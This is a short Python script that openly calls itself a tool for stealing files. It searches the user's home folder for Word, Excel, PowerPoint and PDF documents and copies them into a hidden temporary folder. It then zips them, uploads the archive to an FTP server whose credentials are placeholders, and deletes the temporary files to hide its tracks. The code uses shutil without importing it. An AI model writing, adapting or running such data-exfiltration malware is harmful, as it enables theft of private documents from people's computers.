import os
import zipfile
import random
import ftplib

# Change the values below with your FTP server credentials and the folder you want to upload the zip file to
ftp_server = "ftp.example.com"
ftp_user = "your-username"
ftp_pass = "your-password"
ftp_folder = "/folder-to-upload-to/"

# List of common file types to steal
file_types = ['.doc', '.docx', '.xls', '.xlsx', '.pdf', '.ppt', '.pptx']

# Get a random name for the temporary folder
temp_folder_name = str(random.randint(1000, 9999))

# Create the temporary folder
temp_folder_path = os.path.join(os.environ['TEMP'], temp_folder_name)
os.mkdir(temp_folder_path)

# Search for files of the specified types and copy them to the temporary folder
for root, dirs, files in os.walk(os.path.expanduser('~')):
    for file in files:
        if os.path.splitext(file)[-1] in file_types:
            try:
                shutil.copy(os.path.join(root, file), temp_folder_path)
            except:
                pass

# Zip the contents of the temporary folder
zip_file_name = temp_folder_name + ".zip"
zip_file_path = os.path.join(os.environ['TEMP'], zip_file_name)
with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip:
    for root, dirs, files in os.walk(temp_folder_path):
        for file in files:
            zip.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), temp_folder_path))

# Upload the zip file to the FTP server
ftp = ftplib.FTP(ftp_server)
ftp.login(user=ftp_user, passwd=ftp_pass)
ftp.cwd(ftp_folder)
with open(zip_file_path, 'rb') as file:
    ftp.storbinary('STOR ' + zip_file_name, file)

# Delete the temporary folder and zip file
shutil.rmtree(temp_folder_path)
os.remove(zip_file_path)
